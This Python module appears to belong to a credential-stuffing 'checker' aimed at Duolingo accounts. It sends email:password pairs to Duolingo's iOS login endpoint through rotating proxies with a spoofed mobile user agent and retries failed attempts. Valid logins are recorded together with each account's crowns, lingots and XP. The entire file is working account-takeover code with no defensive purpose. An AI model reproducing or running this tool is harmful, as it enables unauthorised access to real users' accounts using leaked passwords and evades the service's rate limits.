from __main__ import checker
from modules.functions import set_proxy,log,save
from requests import post
from json import dumps

def check(email:str,password:str):
    retries = 0
    while retries != checker.retries:
        proxy = set_proxy()
        header = {"Content-Type":"application/json","UserAgent":"DuolingoMobile/6.14.1 (iPhone; iOS 12.0.1; Scale/2.00)"}
        data = dumps({"password":password,"identifier":email,"fields":"_achievements,adsConfig{units},bio,coachOutfit,courses{authorId,healthEnabled,fromLanguage,id,learningLanguage,placementTestAvailable,title,xp},creationDate,currencyRewardBundles,currentCourse{authorId,checkpointTests,healthEnabled,extraCrowns,fluency,fromLanguage,id,learningLanguage,placementTestAvailable,progressQuizHistory,progressVersion,skills{accessible,bonus,conversations,explanation,finishedLessons,finishedLevels,iconId,id,indicatingNewContent,lessons,levels,name,progressRemaining,shortName,strength,urlName},sections,smartTips,status,title,trackingProperties,xp},email,enableMicrophone,enableSoundEffects,enableSpeaker,experiments,facebookId,fromLanguage,gems,gemsConfig,googleId,health,id,inviteURL,joinedClassroomIds,learningLanguage,lingots,location,motivation,name,observedClassroomIds,optionalFeatures,persistentNotifications,phoneNumber,picture,plusDiscounts,practiceReminderSettings,privacySettings,pushClubs,pushLeaderboards,requiresParentalConsent,referralInfo,roles,shopItems{id,purchaseDate,purchasePrice,subscriptionInfo{renewer},wagerDay},streakData,timezone,timezoneOffset,totalXp,trackingProperties,username,weeklyXp,xpConfig,xpGains{time, xp},zhTw","distinctId":"EE2C72B5-A05E-42F9-9C09-928DEF7C4BF2"})
        try:
            a = post("https://ios-api-2.duolingo.com/2017-06-30/login",data=data,headers=header,proxies=set_proxy(proxy),timeout=checker.timeout)
            if a.text == "{}":
                retries += 1
            elif "lingots" in a.text:
                data = a.json()
                crowns = data["currentCourse"]["trackingProperties"]["total_crowns"]
                lingots = data["trackingProperties"]["lingots"]
                xp = data["totalXp"]
                if not checker.cui:
                    log("good",email+":"+password,"Duolingo")
                save("Duolingo","good",checker.time,email+":"+password+f" | Crowns: {crowns} | Lingots: {lingots} | XP: {xp}")
                checker.good += 1
                checker.cpm += 1
                return
            else:
                raise
        except:
            checker.errors += 1
    if not checker.cui:
        log("bad",email+":"+password,"Duolingo")
    checker.bad += 1
    checker.cpm += 1
    return